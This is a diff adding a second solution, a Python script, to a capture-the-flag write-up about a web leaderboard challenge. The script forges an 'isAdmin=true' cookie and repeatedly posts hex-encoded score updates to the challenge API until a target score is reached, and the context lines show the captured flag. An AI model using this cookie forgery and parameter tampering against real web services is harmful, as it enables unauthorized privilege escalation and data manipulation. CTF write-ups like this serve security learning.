@@ -43,3 +43,54 @@ curl -X POST http://141.85.224.115:7001/api-save-user.php \
 It was accepted by the API: **["Success! Your info has been saved!"]**
 
 But the leaderboard did not reflect the updated score only when the cookie was true.. and we got the flag: **SSS{the_greatest_0f_them_all}**
+
+Or our second solution via a python script:
+```python
+import requests
+import codecs
+import time
+
+# Configuration
+URL = "http://141.85.224.115:7001"
+SESSION_ID = "9bdded797488d3b70c97fe2ca81f57b7"
+USERNAME = "test"
+EMAIL = "test@gmail.com"
+TARGET_SCORE = {current highscore + 1 at least}
+
+# Setup session with cookies
+session = requests.Session()
+session.cookies.set("PHPSESSID", SESSION_ID)
+session.cookies.set("isAdmin", "true")
+
+while True:
+    print("[*] Getting current highscore from leaderboard...")
+    res = session.get(URL + "/leaderboard.php")
+
+    try:
+        current_score = int(res.text.split(f"<li>{USERNAME} - ")[1].split(" points")[0])
+        print(f"[+] Current highscore: {current_score}")
+    except Exception as e:
+        print("[-] Could not parse current highscore. Exiting.")
+        break
+
+    if current_score >= TARGET_SCORE:
+        print(f"[✓] Reached target score ({TARGET_SCORE})!")
+        break
+
+    new_score = current_score + 1
+    print(f"[*] Updating score to {new_score}...")
+
+    # Build payload
+    payload = f"username={USERNAME}&email={EMAIL}&score={new_score}"
+    hex_payload = codecs.encode(payload.encode(), "hex").decode()
+
+    res = session.post(URL + "/api-save-user.php", data={"q": hex_payload})
+
+    if "Success" in res.text:
+        print(f"[✓] Score updated to {new_score}")
+    else:
+        print("[-] Failed to update score. Response:", res.text)
+        break
+
+    time.sleep(0.05)
+```
